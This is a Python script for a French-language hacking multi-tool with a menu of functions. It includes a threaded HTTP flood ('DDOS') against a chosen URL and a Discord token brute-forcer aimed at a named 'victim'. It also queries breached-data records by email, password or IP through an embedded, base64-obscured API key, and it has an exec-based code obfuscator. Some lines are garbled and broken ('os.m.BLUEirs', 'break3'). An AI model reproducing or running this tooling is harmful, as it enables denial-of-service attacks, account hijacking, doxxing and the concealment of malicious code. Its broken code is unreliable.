import fade
import keyboard
import cv2
import ctypes
import string
import numpy as np
import sys
import smtplib
import getpass
import threading
import pystyle
import time
import random
import zlib
import lzma
import base64
import os
import json
import datetime
import requests
from PIL import ImageGrab
from marshal import dumps
from colorama import Fore
from pystyle import System, Anime, Center, Colors, Colorate
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
from colorama import Fore, init


dessin = fade.fire ("""
 ▄▀▀█▄   ▄▀▀▄ ▄▀▄            ▄▀▀█▄▄▄▄  ▄▀▀▄  ▄▀▄  ▄▀▀█▄▄▄▄ 
▐ ▄▀ ▀▄ █  █ ▀  █           ▐  ▄▀   ▐ █    █   █ ▐  ▄▀   ▐ 
  █▄▄▄█ ▐  █    █             █▄▄▄▄▄  ▐     ▀▄▀    █▄▄▄▄▄  
 ▄▀   █   █    █              █    ▌       ▄▀ █    █    ▌  HXH ON TOP
█   ▄▀  ▄▀   ▄▀       ▄      ▄▀▄▄▄▄       █  ▄▀   ▄▀▄▄▄▄   
▐   ▐   █    █               █    ▐     ▄▀  ▄▀    █    ▐   By Ես գալիս եմ Կավկազից
        ▐    ▐               ▐         █    ▐     ▐                                                                   """)

print(dessin)


dessin = fade.water ("Choisisez un nombre")

print(dessin)

SEARCH_TYPES = ["email", "username", "name", "password", "hash", "lastip"]

def search(search_input, search_type):
    if not search_input:
        print(f"{Fore.BLUE}[!] Please enter a search term")
        return

    key = 'c2J5anRoa29mdDR5YWltYndjanFwbXhzOGh1b3Zk'
    mensaje_base64_bytes = key.encode('utf-8')
    mensaje_decodificado_bytes = base64.b64decode(mensaje_base64_bytes)
    apiKey = mensaje_decodificado_bytes.decode('utf-8')

    url = 'https://api-experimental.snusbase.com/data/search'
    headers = {
        'Auth': apiKey,
        'Content-Type': 'application/json'
    }
    payload = {
        'terms': [search_input],
        'types': [search_type],
        'wildcard': False
    }

    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        display_results(response.json().get('results', {}))
    else:
        print(f"{Fore.BLUE}Error: {response.text}")

def display_results(results):
    if not results:
        print(f"{Fore.BLUE}\n[+] Aucun résultats trouver...")
    else:
        for database, entries in results.items():
            for entry in entries:
                for key, value in entry.items():
                    if key == 'lastip':
                        print(f"{Fore.BLUE}[+] {key}: {value} (Get Location)")
                    else:
                        print(f"[+] {Fore.BLUE}{key}: {value}")
                print('-' * 50)


def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def create_directory(category):
    directory = f"./resource/{category}"
    if not os.path.exists(directory):
        os.m.BLUEirs(directory)
    return directory

def save_error_log(error):
    now = datetime.datetime.now()
    timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")
    log_directory = create_directory("logs")
    log_file = os.path.join(log_directory, f"error_{timestamp}.log")
    with open(log_file, "w") as file:
        file.write(str(error))

def ip_info():
    clear_screen()
    print(f"""{Fore.BLUE}
██╗██████╗ ██╗███╗   ██╗███████╗ ██████╗ 
██║██╔══██╗██║████╗  ██║██╔════╝██╔═══██╗
██║██████╔╝██║██╔██╗ ██║█████╗  ██║   ██║
██║██╔═══╝ ██║██║╚██╗██║██╔══╝  ██║   ██║
██║██║     ██║██║ ╚████║██║     ╚██████╔╝
╚═╝╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ 
                                          """)

    try:
        choice = input(Fore.BLUE + '\n[$] Entrez l\'adresse IP publique à suivre : ')
        res = requests.get(f'https://api.techniknews.net/ipgeo/{choice}')
        print_data(data=res.json())

    except Exception as ex:
        print(f"Erreur : {ex}")

    input("Appuyez sur Entrée pour revenir au menu principal.")
    default_menu()

def print_data(data):
    def format_value(value):
        if value is False:
            return "Faux"
        elif value is True:
            return "Vrai"
        else:
            return str(value) if value is not None else 'N/A'

    print(Fore.BLUE + '\n[+] Statut : ' + Fore.BLUE + format_value(data.get('status', 'N/A')))
    print(Fore.BLUE + '[+] Continent : ' + Fore.BLUE + format_value(data.get('continent', 'N/A')))
    print(Fore.BLUE + '[+] Pays : ' + Fore.BLUE + format_value(data.get('country', 'N/A')))
    print(Fore.BLUE + '[+] Code du pays : ' + Fore.BLUE + format_value(data.get('countryCode', 'N/A')))
    print(Fore.BLUE + '[+] Nom de la région : ' + Fore.BLUE + format_value(data.get('regionName', 'N/A')))
    print(Fore.BLUE + '[+] Ville : ' + Fore.BLUE + format_value(data.get('city', 'N/A')))
    print(Fore.BLUE + '[+] Code postal : ' + Fore.BLUE + format_value(data.get('zip', 'N/A')))
    print(Fore.BLUE + '[+] Latitude : ' + Fore.BLUE + format_value(data.get('lat', 'N/A')))
    print(Fore.BLUE + '[+] Longitude : ' + Fore.BLUE + format_value(data.get('lon', 'N/A')))
    print(Fore.BLUE + '[+] Fuseau horaire : ' + Fore.BLUE + format_value(data.get('timezone', 'N/A')))
    print(Fore.BLUE + '[+] Devise : ' + Fore.BLUE + format_value(data.get('currency', 'N/A')))
    print(Fore.BLUE + '[+] FAI : ' + Fore.BLUE + format_value(data.get('isp', 'N/A')))
    print(Fore.BLUE + '[+] Organisation : ' + Fore.BLUE + format_value(data.get('org', 'N/A')))
    print(Fore.BLUE + '[+] AS : ' + Fore.BLUE + format_value(data.get('as', 'N/A')))
    print(Fore.BLUE + '[+] Reverse : ' + Fore.BLUE + format_value(data.get('reverse', 'N/A')))
    print(Fore.BLUE + '[+] Mobile : ' + Fore.BLUE + format_value(data.get('mobile', 'N/A')))
    print(Fore.BLUE + '[+] Proxy : ' + Fore.BLUE + format_value(data.get('proxy', 'N/A')))
    print(Fore.BLUE + '[+] Hébergement : ' + Fore.BLUE + format_value(data.get('hosting', 'N/A')))
    print(Fore.BLUE + '[+] IP : ' + Fore.BLUE + format_value(data.get('ip', 'N/A')))
    print(Fore.BLUE + '[+] En cache : ' + Fore.BLUE + format_value(data.get('ca.BLUE', 'N/A')))
    print(Fore.BLUE + '[+] Horodatage du cache : ' + Fore.BLUE + format_value(data.get('cacheTimestamp', 'N/A')) + '\n')

#Number Info
def number_info():
    clear_screen()
    print(Colorate.Horizontal(Colors.blue_to_cyan,"""
███▄▄▄▄   ███    █▄    ▄▄▄▄███▄▄▄▄         ▄█  ███▄▄▄▄      ▄████████  ▄██████▄  
███▀▀▀██▄ ███    ███ ▄██▀▀▀███▀▀▀██▄      ███  ███▀▀▀██▄   ███    ███ ███    ███ 
███   ███ ███    ███ ███   ███   ███      ███▌ ███   ███   ███    █▀  ███    ███ 
███   ███ ███    ███ ███   ███   ███      ███▌ ███   ███  ▄███▄▄▄     ███    ███ 
███   ███ ███    ███ ███   ███   ███      ███▌ ███   ███ ▀▀███▀▀▀     ███    ███ 
███   ███ ███    ███ ███   ███   ███      ███  ███   ███   ███        ███    ███ 
███   ███ ███    ███ ███   ███   ███      ███  ███   ███   ███        ███    ███ 
 ▀█   █▀  ████████▀   ▀█   ███   █▀       █▀    ▀█   █▀    ███         ▀██████▀  
                                                                                  """))
    try:
        while True:
            phone_number = input(Colorate.Horizontal(Colors.blue_to_cyan, "\nNumero de Telephone -> "))
            print(Colorate.Horizontal(Colors.blue_to_cyan, "Récupération d'informations..."))

            try:
                parsed_number = phonenumbers.parse(phone_number, None)
                if phonenumbers.is_valid_number(parsed_number):
                    if phone_number.startswith("+"):
                        country_code = "+" + phone_number[1:3]
                    else:
                        country_code = "None"
                    operator = carrier.name_for_number(parsed_number, "fr")
                    type_number = "Mobile" if phonenumbers.number_type(parsed_number) == phonenumbers.PhoneNumberType.MOBILE else "Fixe"
                    timezones = timezone.time_zones_for_number(parsed_number)
                    timezone_info = timezones[0] if timezones else "None"
                    country = phonenumbers.region_code_for_number(parsed_number)
                    region = geocoder.description_for_number(parsed_number, "fr")

                    print(Colorate.Horizontal(Colors.blue_to_cyan, f"""
[+] Phone        : {phone_number}
[+] Country Code : {country_code}
[+] Country      : {country}
[+] Region       : {region}
[+] Timezone     : {timezone_info}
[+] Operator     : {operator}
[+] Type Number  : {type_number}
[+] Telegram -> https://t.me/{phone_number}
[+] Whatsapp -> https://wa.me/{phone_number}
[+] Viber -> https://viber.click/{phone_number}"""))
                    
                else:
                    print(Colorate.Horizontal(Colors.blue_to_cyan, " Format invalide ! [Ex: +442012345678 or +33623456789]"))

            except Exception as e:
                print(Colorate.Horizontal(Colors.blue_to_cyan, f" Il y a une exception: {e}"))

            choice = input(Colorate.Horizontal(Colors.blue_to_cyan, "Veux-tu continuer ? (y/n): ")).strip().lower()
            if choice != 'y':
                break3
            else:
                clear_screen()
                print(ascii_art)

    except Exception as e:
        save_error_log(e)
        print(f"Erreur lors de la récupération des informations Number Info : {e}")

    input("Appuyez sur Entrée pour continuer !")
    default_menu()

#ddos
def ddos():
    clear_screen()
    print(Colorate.Horizontal(Colors.blue_to_white, """
 ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░▌ ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ 
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌          ▐░▌
▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░▌ ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
                                                    """))
    print(f"{Fore.MAGENTA}[+] Démarrage du Ddos")

    target = input(f"{Fore.MAGENTA}[+] Entrez l'URL  --->   ")
    num_threads = int(input(f"{Fore.MAGENTA}[+] Entrez le nombre de threads --->   "))

    def ddos(target):
        while True:
            try:
                response = requests.get(target)
                print(f"{Fore.MAGENTA}f[+] Demande envoyée à {target} - Code d'état: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"{Fore.MAGENTA}[+] Erreur: {e}")

    print(f"{Fore.MAGENTA}[+] Initialisation des threads...")

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=ddos, args=(target,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def discord_gen():
    clear_screen()
    print(f"{Fore.BLACK}Générateur de Nitro ")
    print(f"{Fore.BLACK}-----------------------------")
    print()

    webhooklink = input(f"\n[{Fore.MAGENTA}+{Fore.RESET}]  Webhook : ")
    while True:
        try:
            if webhooklink.startswith("https://discord.com/api/webhooks/"):
                webhook = requests.get(webhooklink).json()
                if webhook.get("code") == 50006:
                    print(f"{Fore.CYAN}[!] Webhook Invalid !")
                else:
                    print(f"{Fore.CYAN}[+] Webhook Valide !")
                    break
            else:
                print(f"{Fore.CYAN}[!] Webhook Incorrect Format !")
                webhooklink = input(f"\n[{Fore.MAGENTA}+{Fore.RESET}] Webhook : ")
        except requests.exceptions.RequestException as e:
            print(f"{Fore.CYAN}[!] Erreur lors de la vérification du webhook : {e}")
            break

#Osint
def search_menu():
    clear_screen()
    print(f"{Fore.LIGHTYELLOW_EX}"
    """
                                                       
                                                       
                                               ___     
                        ,--,                 ,--.'|_   
   ,---.              ,--.'|         ,---,   |  | :,'  
  '   ,'\   .--.--.   |  |,      ,-+-. /  |  :  : ' :  
 /   /   | /  /    '  `--'_     ,--.'|'   |.;__,'  /   
.   ; ,. :|  :  /`./  ,' ,'|   |   |  ,"' ||  |   |    
'   | |: :|  :  ;_    '  | |   |   | /  | |:__,'| :    
'   | .; : \  \    `. |  | :   |   | |  | |  '  : |__  
|   :    |  `----.   \'  : |__ |   | |  |/   |  | '.'| 
 \   \  /  /  /`--'  /|  | '.'||   | |--'    ;  :    ; 
  `----'  '--'.     / ;  :    ;|   |/        |  ,   /  
            `--'---'  |  ,   / '---'          ---`-'   
                       ---`-'                          
                                                       
    """)
    print(f"{Fore.LIGHTYELLOW_EX}-----------------------------")
    print(f"{Fore.LIGHTYELLOW_EX}\nChoisissez le type de recherche:")
    print(f"{Fore.LIGHTYELLOW_EX}[1] -> Recherche par Email")
    print(f"{Fore.LIGHTYELLOW_EX}[2] -> Recherche par Pseudo")
    print(f"{Fore.LIGHTYELLOW_EX}[3] -> Recherche par Nom & Prénom")
    print(f"{Fore.LIGHTYELLOW_EX}[4] -> Recherche par Mot de Passe")
    print(f"{Fore.LIGHTYELLOW_EX}[5] -> Recherche par Hash de mot de passe")
    print(f"{Fore.LIGHTYELLOW_EX}[6] -> Recherche par Adresse IP")

    try:
        choice = int(input(f"{Fore.LIGHTYELLOW_EX}\nChoisissez une option (1-6) : ")) - 1
        if 0 <= choice < len(SEARCH_TYPES):
            search_type = SEARCH_TYPES[choice]
            search_input = input(f"{Fore.LIGHTYELLOW_EX}Entrez le terme de recherche : ").strip()

            if not search_input:
                print(f"{Fore.CYAN}[!] Terme de recherche non fourni.")
            else:
                print(f"{Fore.LIGHTYELLOW_EX}Term de recherche: {search_input}")  
                print(f"{Fore.LIGHTYELLOW_EX}Type de recherche: {search_type}")   
                search(search_input, search_type)
        else:
            print(f"{Fore.CYAN}[!] Option invalide.")
    except ValueError:
        print(f"{Fore.CYAN}[!] Entrée invalide. Veuillez entrer un nombre.")

    input(f"{Fore.YELLOW}\nAppuyez sur Entrée pour continuer...")
    default_menu()

# Obf
def Obf():
    clear_screen()
    print(f"{Fore.LIGHTBLACK_EX}"
      """
    ,-----.     _______    ________  
  .'  .-,  '.  \  ____  \ |        | 
 / ,-.|  \ _ \ | |    \ | |   .----' 
;  \  '_ /  | :| |____/ / |  _|____  
|  _`,/ \ _/  ||   _ _ '. |_( )_   | 
: (  '\_/ \   ;|  ( ' )  \(_ o._)__| 
 \ `"/  \  ) / | (_{;}_) ||(_,_)     
  '. \_/``".'  |  (_,_)  /|   |      
    '-----'    /_______.' '---'      
                                        """)

    junk = "__0x0x0x__" * 15

    file = input(f"{fade.fire('Veuillez glisser le fichier ici : ')}").strip().strip('"').strip("'")
    print(f"Chemin du fichier reçu : {file}")

    chars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 
             'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']

    def genvar():
        var = ''
        for i in range(10):
            var += random.choice(chars)
        return var

    def compress(text):
        ok = zlib.compress(text.encode())
        ok = lzma.compress(ok)
        return ok

    def encrypt1(text):
        src = compile(text, 'coduter', 'exec')
        ma = dumps(src)
        s = f'{junk}="{junk}";{junk}="{junk}";{junk}="{junk}";exec(loads({ma}));{junk}="{junk}";{junk}="{junk}"'
        compresse = compress(s)
        oke = f"import zlib,lzma\nexec(zlib.decompress(lzma.decompress({compresse})))"
        return oke

    def encrypt2(text):
        sta = genvar()
        code = text
        s = compile(code, 'coduter', 'exec')
        maa = dumps(s)
        stub2 = f'from marshal import loads;exec(loads({maa}));'
        fin = f'{junk}="{junk}";{junk}="{junk}";{stub2}{junk}="{junk}";{junk}="{junk}";'
        return fin

    if not os.path.isfile(file):
        print('Fichier introuvable')
        exit()
    
    print('\n[+] cryptage ...')

    with open(file, 'r', encoding='utf-8') as f:
        code = f.read()

    code = encrypt1(code)
    code = encrypt2(code)
    
    print('[+] done\n')
    
    name = file.split('/')[-1]
    name = name.split('.')[0]
    
    with open(f'{name}-obf.py', 'w', encoding='utf-8') as f:
        f.write(code)

    print(f"{Fore.LIGHTYELLOW_EX}Votre fichier est obfusqué et enregistré sous {name}-obf.py\n")
    input("Appuyez sur Entrée pour revenir au menu de base...")
    default_menu()

    # token brute force
def token_bruteforce():
    clear_screen()
    print(f"{Fore.CYAN}"
          """
 _______  _____  _     _ _______ __   _      ______   ______ _     _ _______ _______      _______  _____   ______ _______ _______
    |    |     | |____/  |______ | \  |      |_____] |_____/ |     |    |    |______      |______ |     | |_____/ |       |______
    |    |_____| |    \_ |______ |  \_|      |_____] |    \_ |_____|    |    |______      |       |_____| |    \_ |_____  |______
                                                                                                                                      
   """)

    time.sleep(2)

    idtoken = base64.b64encode(input("Identification de la victime ---> ").encode("ascii")).decode("ascii")
    thrd = input("Threads ---> ")

    def bruhmoment():
        while True:
            token = (idtoken + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' +
                     ''.join(random.choices(string.ascii_letters + string.digits, k=25)))
            header = {"Autorisation": token}
            bruh = requests.get('https://discordapp.com/api/v9/auth/login', headers=header)

            if bruh.status_code == 200:
                print(f"{Fore.CYAN}[!] VALID {token}")
                with open('hits.txt', "a+") as file:
                    file.write(f'{token}\n')
            else:
                print(f"{Fore.LIGHTCYAN_EX}[!] INVALID {token}")

    threads = []

    for _ in range(int(thrd)):
        t = threading.Thread(target=bruhmoment)
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()
        default_menu()
        token_bruteforce()


def default_menu():
    try:
        clear_screen()
        text_default_fade = fade.fire 
        print(text_default_fade)
        choose_text = fade.fire( """
 ▄▀▀█▄   ▄▀▀▄ ▄▀▄            ▄▀▀█▄▄▄▄  ▄▀▀▄  ▄▀▄  ▄▀▀█▄▄▄▄ 
▐ ▄▀ ▀▄ █  █ ▀  █           ▐  ▄▀   ▐ █    █   █ ▐  ▄▀   ▐ 
  █▄▄▄█ ▐  █    █             █▄▄▄▄▄  ▐     ▀▄▀    █▄▄▄▄▄  
 ▄▀   █   █    █              █    ▌       ▄▀ █    █    ▌  HXH ON TOP
█   ▄▀  ▄▀   ▄▀       ▄      ▄▀▄▄▄▄       █  ▄▀   ▄▀▄▄▄▄   
▐   ▐   █    █               █    ▐     ▄▀  ▄▀    █    ▐   By Ես գալիս եմ Կավկազից
        ▐    ▐               ▐         █    ▐     ▐  
----------------------------------------------------------------------                                                     
 [1] IpInfo    [2] Num info [3] DDOS
 [4] Osint     [5] Obf      [6] Discord Nitro gen
 [7] Token brute force      [8] Quitter                                                                                                                  
        """)
        print(choose_text)

        choice = input(f"{fade.fire('Choisissez une option : ')}")

        if choice == "1":
            ip_info()
        elif choice == "2":
            number_info()
        elif choice == "3":
            ddos()
        elif choice == "4":
            search_menu()
        elif choice == "5":
            Obf()
        elif choice == "6":
            discord_gen()
        elif choice == "7":
            token_bruteforce()
        elif choice == "8":
            exit()
        else:
            print(f"{Fore.RED}[!] Option invalide. Veuillez réessayer.")
            default_menu()
    except Exception as e:
        save_error_log(e)
        print(f"Erreur lors de l'affichage du menu : {e}")

default_menu()